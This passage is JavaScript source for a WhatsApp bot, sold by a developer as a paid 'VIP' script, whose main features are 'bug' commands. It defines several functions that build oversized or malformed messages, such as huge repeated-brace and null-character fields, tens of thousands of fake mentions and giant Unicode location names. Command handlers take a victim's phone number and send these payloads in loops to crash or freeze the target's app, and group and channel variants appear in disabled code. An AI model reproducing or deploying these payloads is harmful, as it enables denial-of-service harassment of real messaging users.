          protocolMessage: {
            key: msg.key,
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: {
                is_status_mention: "true"
              }
            }
          ]
        }
      }
    };
    await justinn.relayMsg(isTarget, message, {});
  }
    console.log('🩸Proses Pengiriman Bug Fc Invis Mentions Done🔥')
}

async function JustinDelay(isTarget) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "JustinOffc",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -6666666666,
                degreesLongitude: 6666666666,
                name: "JustinOffc",
                address: "JustinOffc",
              },
            },
            body: {
              text: "JustinOffc",
            },
            nativeFlowMessage: {
              messageParamshtml: "{".repeat(10000),
            },
            contextInfo: {
              participant: isTarget,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await justinn.relayMsg(isTarget, message, {
      messageId: null,
      participant: { jid: isTarget },
      userJid: isTarget,
    });
  } catch (err) {
    console.log(err);
  }
    console.log('🩸Proses Pengiriman Bug Delay Invisible Done🔥')
}

async function wraperOsCards(isTarget, rep, mention) {
  const space = "{".repeat(rep)
  const PrM = await prepareWAMessageMedia(
    { image: peler },
    { upload: justinn.waUploadToServer }
  );

  const cardsCrL = Array.from({ length: 10 }, () => ({
    header: {
      imageMessage: PrM.imageMessage,
      hasMediaAttachment: true
    },
    nativeFlowMessage: {
      messageParamshtml: space
    }
  }));

  const messagePayload = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: { text: "🩸 YT JustinOfficial-ID " },
          carouselMessage: {
            cards: cardsCrL,
            messageVersion: 1
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(isTarget, messagePayload, {});

  await justinn.relayMsg("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: isTarget } }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    const message = {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: {
                is_status_mention: "true"
              }
            }
          ]
        }
      }
    };
    await justinn.relayMsg(isTarget, message, {});
  }

  console.log(chalk.red("🩸Success Sending Forclose Invisible"));
}



//DELAY MAKER
async function DelayCrash(isTarget, mention) {
  let msg = await generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "🩸 YT JustinOfficial-ID",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "Justin Official",
            paramshtml: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9741,
            forwardedNewsletterMessageInfo: {
              newsletterName: "Information Script Justin",
              newsletterJid: "120363373003239606@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {});

  await justinn.relayMsg("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: isTarget }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await justinn.relayMsg(isTarget, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "JustinOffcBOT" },
              content: undefined
            }
          ]
        }
      }
    }, {});
  }
  console.log(chalk.red("🩸Success Sending Delay Crash Bug"));
}

async function Crash(target, Ptcp = true) {
    await justinn.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "p",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramshtml: "꧔꧈".repeat(9000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: target}});
}
const Qcrl = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    interactiveMessage: {
      body: { 
        title: "", 
        text: "\u0000".repeat(1000000),
        footer: "",
        description: ""
      },
      carouselMessage: {
        cards: []
      },
      contextInfo: {
        mentionedJid: ["status@broadcast"]
      }
    }
  }
};

async function CrashInvis(target, Ptcp = true) {
    await justinn.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "p",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "payment_transaction_request",
                        paramshtml: "\u0000".repeat(1000000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: target }});
}

 async function iosinvis(justinn, X) {
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "Than XS" + "𑇂𑆵𑆴𑆿".repeat(15000),
         address: "Than XS" + "𑇂𑆵𑆴𑆿".repeat(5000),
         url: `https://than.example.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
      }
      let msg = generateWAMessageFromContent(X, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: {
            text: "🩸 YT JustinOfficial-ID",
            matchedText: "https://t.me/justinoffc",
            description: "than xs".repeat(15000),
            title: "than xs" + "than xs".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(X, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      await justinn.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [X],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: X
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await justinn.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [X],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: X
                  },
                  content: undefined
               }]
            }]
         }]
      });
   } catch (err) {
      console.error(err);
   }
};

async function CrlSqL(isTarget) {
  const cards = [];

  const media = await prepareWAMessageMedia(
    { video: fs.readFileSync("./start/piw.mp4") },
    { upload: justinn.waUploadToServer }
  );

  const header = {
    videoMessage: media.videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "FnX-" + Date.now(),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "🩸 YT JustinOfficial-ID ",
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            externalAdReply: {
              title: "Finix AI Broadcast",
              body: "Trusted System",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "https://tama.example.com",
              showAdAttribution: false // trigger 1
            }
          }
        }
      }
    }
  };

  for (let r = 0; r < 15; r++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamshtml: "{".repeat(10000) // trigger 2
      }
    });
  }

  const msg = generateWAMessageFromContent(
    isTarget,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "🩸 YT JustinOfficial-ID "
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "FnX" + "-Id" + Math.floor(Math.random() * 99999), // trigger 3
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550002@s.whatsapp.net"], // trigger 4
              externalAdReply: {
                title: "Finix Engine",
                body: "",
                thumbnailUrl: "https://example.com/",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://finix-ai.example.com",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await justinn.relayMessage(isTarget, msg.message, {
    participant: { jid: isTarget },
    messageId: msg.key.id
  });
}

 
        
const bugres = 'Wait, Proses Mengirim Bug Mungkin Akan Memakan Waktu Selama 5Menit Sampai 10Menit\n\n> Target Akan Mengalami Crash/Forclose Jika Waktu Pengiriman Telah Selesai!...'
//=============== CASE ================//
switch (command) {
case 'bug':
case 'buy':
case 'sc':
case 'dev':
case 'developer':
case 'buysc':
case 'own':
case 'script': {
justinn.sendMsg(from, {react: {text: "🩸", key: m.key}})
let menu = `*Script Versi Vip* , Hubungi Dev Atau Yang Bersangkutan Dengan Justin, Hindari Trx Dngan Org Lain, Agar Tidak Terkena Penipuan!

- V20 Via Telegram 75K
- V20 Via WhatsApp 55K`
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterName: `Information Script Justin`,
 newsletterJid: "120363373003239606@newsletter",
 serverMessageId: 143
},
 businessMessageForwardInfo: { businessOwnerJid: justinn.decodeJid(justinn.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: menu
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: "Developer JustinOfficial"
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: ``,
 subtitle: "",
 hasMediaAttachment: true,
 ...(await prepareWAMessageMedia({ image: loveu }, { upload: justinn.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
"name": "cta_url",
"buttonParamshtml": `{\"display_text\":\"Kontak Justin\",\"url\":\"https://wa.me/6285176915043\",\"merchant_url\":\"https://wa.me/6285176915043\"}`
},
{
"name": "cta_url",
"buttonParamshtml": `{\"display_text\":\"Saluran Utama Justin\",\"url\":\"https://whatsapp.com/channel/0029VaxxUio545v2bL3FE91g\",\"merchant_url\":\"https://wa.me/6285176915043\"}`
},
{
"name": "cta_url",
"buttonParamshtml": `{\"display_text\":\"Saluran Kedua Justin\",\"url\":\"https://whatsapp.com/channel/0029VbB5UQdGE56grPRZ6e13/\",\"merchant_url\":\"https://wa.me/6283148534432\"}`
}],
 })
 })
 }
 }
}, {})

await justinn.relayMsg(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
await justinn.sendMsg(m.chat, { audio: { url: `https://files.catbox.moe/309zyo.mp3` }, mimetype: 'audio/mp4', ptt: true }, { quoted: m });
      }
      break;
            

case 'tools': {
    if (isBan) return
    let peler = `こんにちはですシステムウイルスを使用してあなたを助けるために設計されたボットです助ける。
 
*- 計さ FITUR MAIN TOOLS*
 ⌬ Brat
 ⌬ Tourl
 ⌬ Cekidch 
 ⌬ Hd
 ⌬ Remini 
 ⌬ Tiktok
 ⌬ Instagram 
 ⌬ Play
 ⌬ Youtube
 ⌬ Antilink
 ⌬ Facebook
 ⌬ Ytmp3
 ⌬ Ytmp4
 ⌬ Tiktokmp3
 ⌬ Tiktokmp4
 ⌬ Plays
 ⌬ Rvo
 ⌬ Getsw
 ⌬ Chatgpt
 ⌬ Enchard
 ⌬ Banchat
 ⌬ Unbanchat
 ⌬ Toimg
 ⌬ Tovn
 ⌬ Quoted
 ⌬ Nsfw
 ⌬ Tovocal
 ⌬ Pinterest
 ⌬ Pinvid
`
    justinn.sendMsg(m.chat, {
        text: peler,
        footer: "Developer JustinOfficial",
        buttons: [       
            {
                buttonId: '.sc',
                buttonText: {
                    displayText: 'Buy Script Vip' },
                type: 1,
            },
            {     
                buttonId: '.menu',
                buttonText: { displayText: 'Back' },
                type: 1,
            }
        ],
        headerType: 1,
        viewOnce: true,
    }, { quoted: catalems })
}
break;

case 'testsd':
case 'inwhsv':
case 'desbshy':
case 'delsbbsa': {
if (!isPremium) return reply('Khusus User Premium')
if (!q) return reply(`Example: ${prefix + command} 62×××`)
let isTarget = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 5; i++) {
await infinity(isTarget)
}
reply(`Pengiriman Bug Telah Selesai\n\n- Version : 20 Fase2\n- Status : Vip Buy Only!!\n> Warning!!, Gunakan Jeda Setelah Pemakaian, Jeda Selama 10-15 Menit Agar Tidak Mudah Kenon!!`)
}
break
     
case 'fcinvis2':
case 'forclose2': {
if (!isPremium) return reply('Khusus User Premium')
if (!q) return reply(`Example: ${prefix + command} 62×××`)
let isTarget = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 20; i++) {
await wraperOsCards(isTarget, 10000, false)
    await sleep(2000)
}
reply(`Pengiriman Bug Telah Selesai\n\n- Version : 20 Fase2\n- Status : Vip Buy Only!!\n> Warning!!, Gunakan Jeda Setelah Pemakaian, Jeda Selama 10-15 Menit Agar Tidak Mudah Kenon!!`)
}
break

case 'delayinvis':
case 'invisdelay': {
if (!isPremium) return reply('Khusus User Premium')
if (!q) return reply(`Example: ${prefix + command} 62×××`)
let isTarget = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 55; i++) {
await wraperOsCards(isTarget, 10000, false)
    await sleep(1000)
    await wraperOsCards(isTarget, 10000, false)
    await sleep(1000)
    await DelayCrash(isTarget)
    await sleep(1000)
    await invisCrL(isTarget)
    await sleep(1000)
}
reply(`Pengiriman Bug Telah Selesai\n\n- Version : 20 Fase2\n- Status : Vip Buy Only!!\n> Warning!!, Gunakan Jeda Setelah Pemakaian, Jeda Selama 10-15 Menit Agar Tidak Mudah Kenon!!`)
}
break


case 'wraperoscards':
case 'forclose':
case 'Izalcs':
case 'Izalfcbos':
case 'propovers':
case 'infinity': {
if (!isPremium) return reply('Khusus User Premium')
if (!q) return reply(`Example: ${prefix + command} 62×××`)
let isTarget = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 10; i++) {
await infinityThan(justinn, isTarget);
await infinityThan(justinn, isTarget);
await CrlSqL(justinn, isTarget);
}
reply(`Pengiriman Bug Telah Selesai\n\n- Version : 20 Fase2\n- Status : Vip Buy Only!!\n> Warning!!, Gunakan Jeda Setelah Pemakaian, Jeda Selama 10-15 Menit Agar Tidak Mudah Kenon!!`)
}
break
        
case 'ipinvis':
case 'iosinvis': {
if (!isPremium) return reply('Khusus User Premium')
if (!q) return reply(`Example: ${prefix + command} 62×××`)
let isTarget = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 10; i++) {
await iosinvis(justinn, isTarget);
}
reply(`Pengiriman Bug Telah Selesai\n\n- Version : 20 Fase2\n- Status : Vip Buy Only!!\n> Warning!!, Gunakan Jeda Setelah Pemakaian, Jeda Selama 10-15 Menit Agar Tidak Mudah Kenon!!`)
}
break
        
case 'kill-gc':
case "x-grup": {
    if (!Access && !isPremium) return reply("Khusus Premium ");
   /* if (!text || !text.includes("chat.whatsapp.com")) {
        return reply("Kirim link grup WhatsApp\nContoh: .kill-gc https://chat.whatsapp.com/xxx");
    }
    let linkgc = text.trim();
    let code = linkgc.split("https://chat.whatsapp.com/")[1];
    if (!code) return reply("⚠️ Link grup tidak valid!");
    // Join dulu ke grup target
    let res = await justinn.groupAcceptInvite(code).catch(e => reply("yahh gagal join grup!"));
    // Dapatkan ID grup dari hasil join
    let target = res; // Format: 120xxxxxxxx@g.us
    // Kirim notif awal
    await justinn.sendMsg(m.chat, { text: `Berhasil Masuk Dan Mengirim Fungsi ${target}` });

    // Kirim bug ke grup target
    await justinn.sendMsg(target, {
        text: "🩸YT : JustinOfficial-ID",
        contextInfo: {
            externalAdReply: {
                title: "Crash Kill Grup",
                body: "Developer Justin",
                sourceUrl: "https://whatsapp.com/channel/0029VaxxUio545v2bL3FE91g",
            },
        },
    });

    // Spam ke grup target (loop ringan biar ga kena rate limit)
    for (let i = 0; i < 5; i++) {
  await Caraousel(target, ptcp = true);
  await Caraousel(target);
  await Caraousel(target, true);
        await sleep(1200);
    }

    reply("Done Attack Grup By Justin 🩸");*/
    reply("👻 Mohon Maaf Fitur ini sedang dalam masa uji coba!");
    
}
break;
        
case "kill-saluran": {
    if (!isPremium) return reply("Akses Ditolak!!");
    const targetChannel = args[0]; // ID Channel (contoh: "123456789101112@broadcast")
    if (!targetChannel) {
        return Justinnreply(`Example :.${command} 123456789101112@broadcast`);
    }
    // Kirim pesan awal proses
    await justinn.sendMsg(m.chat, {
    image: { url: "https://files.catbox.moe/uaaunf.jpg" },
      caption: "Proses Mengirim Bug Channel",
    });

    const total = 2000;

    for (let i = 0; i < total; i++) {
        try {
            await CrashJids(targetChannel);

            if (i === 10) {
                // Kirim pesan progress setelah beberapa iterasi
                await justinn.sendMsg(m.chat, {
                    text: `Prosess... (${i}/${total})`,
                });
            }
        } catch (error) {
            console.error("❌ Gagal Mengirim", error);
            return Justinnreply("Erorr: Gunakan Id Saluran");
        }
        await sleep(1000); // Jeda agar tidak overload
    }

    // Kirim pesan selesai
    await justinn.sendMessge(m.chat, {
        image: { url: "https://files.catbox.moe/j0hsm5.jpg" },
        caption: "Sukses Mengirim Bug Chanel",
        contextInfo: {
            externalAdReply: {
                title: "YT : JustinOfficial-ID",
                body: "Bít.ly/JustinOfficial",
                sourceUrl: "https://whatsapp.com/channel/0029VaxxUio545v2bL3FE91g",
            },
        },
    });

    Justinnreply("Attack Selesai, Gunakan Jeda!"); */
     reply("👻 Mohon Maaf Fitur ini sedang dalam masa uji coba!");
}
break;

    
case 'menu': case "p": {
const tampilan = `こんにちはですシステムウイルスを使用してあなたを助けるために設計されたボットです助けるあなた。 
  
*- 計さ INFORMATION BOT*
 ⌬ Botname : JustinOffc
 ⌬ Version : 20.0.2 Fase2
 ⌬ Mode : *Self* Mode
 ⌬ Status : Vip Buy Onlyy!!`
let buttons = [
        { buttonId: ".sc", buttonText: { displayText: "Buy Versi Tele" }, type: 1 },
        
        
    ];
    let buttonMessage = {
    image: { url: `https://files.catbox.moe/9id6oh.jpg` },
gifPlayback: false,
caption: tampilan,
contextInfo: {
externalAdReply: {
title: 'JustinV20 Fase2',
                    body: 'Tiktok : JustinOfficial',
                    showAdAttribution: true,
                    thumbnailUrl: `https://files.catbox.moe/r14cz4.jpg`,
                    mediaType: 4,
                    MediaUrl: 'www.tiktok.com/@justinandiar',
                    sourceUrl: "www.tiktok.com/@justinandiar",
                }
            },    
        footer: "Developer JustinOfficial",
        buttons: buttons,
        viewOnce: true,
         headerType: 4
    };

const flowActions = [
    {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramshtml: html.stringify({
                title: "Show All Fitur",
                sections: [
                    {
          title: "Fitur Utama Script Justin",
          highlight_label: "Populer",
                rows: [
        { title: "Bug Menu", description: "Menampilkan Semua Fitur Bug", id: ".bugmenu" }
                      ]
                      },
                      {
          title: "Bagian Fitur Akses Owner",
          highlight_label: "Akses Owner",
          rows: [
        { title: "Owner Menu", description: "Menampilkan Fitur Owner", id: ".ownermenu" },
        { title: "Tools", description: "Fitur Main Tools", id: ".tools" }   
                      ]
                    },
                    {
          title: "All Name Partner Justin",
          highlight_label: "Support Justin",
          rows: [
        { title: "Best Friends", description: "Partner Justin", id: ".ptjustin" }
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    },
];

// Tambahkan flowActions ke buttonMessage
buttonMessage.buttons.push(...flowActions);

// Kirim pesan
await justinn.sendMsg(m.chat, buttonMessage, { quoted: m });
await justinn.sendMsg(m.chat, { audio: { url: `https://files.catbox.moe/309zyo.mp3` }, mimetype: 'audio/mp4', ptt: true }, { quoted: m });
      }
      break

case 'ptjustin': case "justinpt": {
const tampilan = `こんにちはですシステムウイルスを使用してあなたを助けるために設計されたボットです助けるあなた。 

*- 計さ PARTNER JUSTIN*
 ⌬ Aiox Lutbotz
 ⌬ KyuuuRzy 
 ⌬ ThannXs
 ⌬ Derr Official
 ⌬ Lenx Official
 ⌬ RizzXD Official
 ⌬ Daffa Ravage
 ⌬ Alwaysaqio
 ⌬ Aima Official
 ⌬ DrayXD Official
 ⌬ SanzXD Official
 ⌬ DanzXD Official
 ⌬ Kaizii
 ⌬ HyuZoldyck
 ⌬ Fahrul Official
 ⌬ ManxzGanzz
 ⌬ Jarot XD
 ⌬ GanXJudgeZ 
 ⌬ RyooOffc
 ⌬ KingFian
 ⌬ Xway Offc PYTHON
 ⌬ Zynn Offc
 ⌬ IkyOfficial
 ⌬ VanzOfficial
 ⌬ HbazZ Office
 ⌬ Dilxz Mods
 ⌬ Rizz official
 ⌬ Repzcina Official
 ⌬ Nted Official
 ⌬ Manzrowr
 ⌬ FirmanXD Official
 ⌬ Heykals Official
 ⌬ Ditzxy Official
 ⌬ Camoyy Official
 ⌬ Frédéric
 ⌬ Deruhu Forever
 ⌬ Fath heart
 ⌬ RenTzy 
 ⌬ Rulzz gtg
 ⌬ CoganNotDev
 ⌬ ZyynTamvan
 ⌬ Pauuukagenou
 ⌬ Karll
 ⌬ JackySTR
 ⌬ Muqitblabla
 ⌬ Vinnbug
